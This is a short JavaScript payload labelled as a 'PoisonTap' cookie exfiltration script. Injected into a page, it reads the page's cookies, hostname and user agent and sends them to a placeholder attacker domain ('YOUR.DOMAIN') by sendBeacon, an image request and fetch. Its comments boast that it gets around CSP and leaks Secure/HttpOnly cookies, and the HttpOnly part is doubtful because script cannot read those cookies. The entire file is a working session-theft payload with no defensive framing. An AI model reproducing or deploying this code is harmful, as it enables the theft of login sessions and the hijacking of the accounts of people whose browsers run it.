// PoisonTap 2026 | Multi-Transport Cookie Exfil
(function(){
  if(window.__PT_EXFIL) return;
  window.__PT_EXFIL = true;
  try {
    var c = document.cookie;
    if (!c || !c.trim()) return;
    var h = document.location.hostname || 'unknown';
    var u = navigator.userAgent ? navigator.userAgent.substring(0, 200) : '';
    var p = encodeURIComponent(h) + '|' + encodeURIComponent(c) + '|' + encodeURIComponent(u);
    var D = 'YOUR.DOMAIN';
    var U = 'http://' + D + '/poisontap/log.php?log=' + p;

    // 1. sendBeacon (survives unload, highest reliability)
    try { if (navigator.sendBeacon) navigator.sendBeacon('http://'+D+'/poisontap/log.php', new Blob([p], {type:'text/plain'})); } catch(e){}
    // 2. Image leak (bypasses CSP, leaks Secure/HttpOnly via http:)
    try { var i = new Image(); i.src = U; i.onload = i.onerror = function(){ i.src = null; }; } catch(e){}
    // 3. Fetch fallback (modern strict policies)
    try { fetch(U, { mode: 'no-cors', cache: 'no-cache' }); } catch(e){}
  } catch(e) {}
})();
